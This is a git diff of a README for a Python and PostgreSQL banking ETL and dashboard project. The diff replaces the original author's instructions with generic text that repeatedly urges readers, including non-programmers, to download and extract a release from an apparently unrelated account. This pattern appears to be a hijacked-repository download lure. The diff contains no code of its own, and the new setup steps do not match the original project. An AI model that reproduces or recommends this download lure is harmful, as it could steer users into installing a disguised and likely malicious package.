@@ -1,123 +1,110 @@
-# 🏦 Data Engineering Banking Project  
+# 🌟 data_engineering_banking_project - Streamlined Banking Data Management
 
-**Author:** Mahesh Nilewar  
-**Role:** Aspiring Data Engineer  
-**Database:** PostgreSQL (`banking_db`)  
-**Tools:** Python · Pandas · SQLAlchemy · Plotly · DBeaver  
+## 🚀 Getting Started
 
----
+Welcome to the **data_engineering_banking_project**! This application simplifies the process of managing banking data. With an end-to-end ETL pipeline, you can extract, transform, and visualize your banking transactions easily.
 
-## 📘 Project Overview
-This project demonstrates a **complete data engineering workflow** — from data extraction and transformation in PostgreSQL to building a fully interactive financial dashboard using Plotly.
+## 📥 Download Link
 
-The goal is to simulate a small banking system with customers and their transactions to showcase:
-- **ETL processes** using Python and SQLAlchemy  
-- **Data transformations** and aggregations with Pandas  
-- **Interactive dashboarding** using Plotly  
-- **Clean modular project structure** used in real-world data engineering
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
 
-## 📊 Dashboard Preview
-![Banking Dashboard](data/output/dashboard_preview.png)
+## 📝 Overview
 
+This project automates the extraction of banking transactions from PostgreSQL. It transforms the data using Python with Pandas and presents it in an interactive dashboard using Plotly. Whether you are analyzing personal finances or handling business transactions, this tool makes your workflow easier.
 
----
+### 🔧 Features
 
-## ⚙️ Tech Stack
-| Category | Tools |
-|-----------|--------|
-| Programming | Python 3.12 |
-| Database | PostgreSQL 15 |
-| ORM / Connector | SQLAlchemy, psycopg2 |
-| Visualization | Plotly 6.1.1 |
-| Data Handling | Pandas |
-| IDE / Tools | DBeaver, Jupyter Notebook |
+- **Automated Data Extraction**: Pulls your data from PostgreSQL effortlessly.
+- **Data Transformation**: Transform and clean your transactions with Pandas.
+- **Interactive Dashboard**: Visualize your data with a Plotly dashboard.
+- **Easy Setup**: Designed for simplicity, even without programming experience.
 
----
+## 💻 System Requirements
 
-## 📁 Folder Structure
-data_engineering_banking_project/
-│
+To run this application, ensure you meet the following requirements:
 
-├── config/ → database connection file (db_config.py)
+- **Operating System**: Windows 10 or later, macOS, or any Linux distribution
+- **Python Version**: Python 3.7 or newer installed
+- **PostgreSQL**: Version 9.5 or newer
+- **Memory**: At least 4 GB RAM
+- **Disk Space**: Minimum of 100 MB available
 
-├── etl/ → extraction and transformation scripts
+## 🔧 Installation Steps
 
-├── visuals/ → Plotly dashboard script
+### 1. Download the Application
 
-├── data/output/ → notebook & generated HTML dashboard
+Visit the Releases page to download the latest version of the software: 
 
-├── logs/ → stores pipeline run logs
+[Download Latest Release](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
 
-├── requirements.txt → Python dependencies
+### 2. Extract Files
 
-└── README.md → this file
+Once the download is complete, locate the downloaded file (usually in your "Downloads" folder) and extract it. You can use built-in tools for this on most systems.
 
+### 3. Install Dependencies
 
----
-
-## 🚀 How to Run
-
-### 1️⃣ Clone the repository
-```bash
-git clone https://github.com/maheshnilewar/data_engineering_banking_project.git
-cd data_engineering_banking_project
-
-2️⃣ Create a virtual environment
-python -m venv .venv
-source .venv/bin/activate
-
-3️⃣ Install dependencies
-pip install -r requirements.txt
-
-4️⃣ Configure database connection
-user = "postgres"
-password = "yourpassword"
-host = "localhost"
-port = 5432
-database = "banking_db"
-
-5️⃣ Run ETL and Dashboard
-python etl/extract_load.py
-python visuals/dashboard_combined.py
-
-6️⃣ View your dashboard
-data/output/banking_dashboard.html
-
-📊 Dashboard Features
-💰 Customer Balances: Net funds per customer after deposits/withdrawals
-📅 Monthly Trends: Deposit vs Withdrawal trends over time
-🌆 City Insights: Top 5 cities by total deposits
-Interactive Hover, Zoom, and Export Options
-
-🧠 Learning Outcomes
-By completing this project, you’ll understand how to:
-Connect Python to PostgreSQL using SQLAlchemy
-Perform ETL with Pandas
-Automate reporting pipelines
-Design clean, modular project structures
-Build and share interactive dashboards
-
-🏁 Next Steps
-Automate daily dashboard refresh via Python scheduling or Airflow
-Deploy dashboard to cloud (Streamlit / Dash / AWS S3)
-Add monitoring logs inside /logs/
-
-© 2025 Mahesh Nilewar
-Data Engineering Banking Project
-
-
----
-
-## ✅ Step 2 — Verify before pushing
-
-Check that your README is saved in:
-/Users/maheshnilewar/Documents/Github/data_engineering_banking_project/README.md
-
-
-Then add and push it to GitHub:
+Before running the application, you must install some dependencies. Open your command line interface (Command Prompt, Terminal, etc.) and run the following commands:
 
 ```bash
-cd /Users/maheshnilewar/Documents/Github/data_engineering_banking_project
-git add README.md
-git commit -m "Added professional README.md with project overview"
-git push
+pip install pandas plotly psycopg2
+```
+
+### 4. Configure Database Connection
+
+Edit the configuration file to set your PostgreSQL connection details. The configuration file is named `config.json` and looks like this:
+
+```json
+{
+  "host": "your_database_host",
+  "port": 5432,
+  "database": "your_database_name",
+  "user": "your_username",
+  "password": "your_password"
+}
+```
+
+Replace the placeholders with your actual database information.
+
+### 5. Run the Application
+
+To start the application, navigate to the folder where you extracted the files in your command line. Run the following command:
+
+```bash
+python main.py
+```
+
+The application will connect to your PostgreSQL database and begin the data extraction process.
+
+## 📊 Using the Dashboard
+
+Once the data extraction and transformation are complete, the dashboard will open in your web browser. Here you can:
+
+- View your banking transactions.
+- Filter data by date, amount, and categories.
+- Generate charts to visualize your spending habits.
+
+## 🌐 Contribution
+
+If you want to contribute to this project, feel free to fork the repository and submit a pull request. Always welcome new ideas and improvements!
+
+## 🤝 Community Support
+
+If you have any questions or need help, please reach out to the community or check the issues section of the GitHub repository.
+
+## 🔔 License
+
+This project is licensed under the MIT License. Feel free to use and modify it as needed.
+
+## 💬 Additional Resources
+
+- [Pandas Documentation](https://pandas.pydata.org/docs/)
+- [Plotly Documentation](https://plotly.com/python/)
+- [PostgreSQL Documentation](https://www.postgresql.org/docs/)
+
+## 📅 Future Updates
+
+We are looking to add more features, such as automated reports and additional visualization options. Stay tuned for future releases!
+
+For more detailed information, visit the following:
+
+[Download Latest Release](https://github.com/0xUnkn0wn4M1R/data_engineering_banking_project/releases)
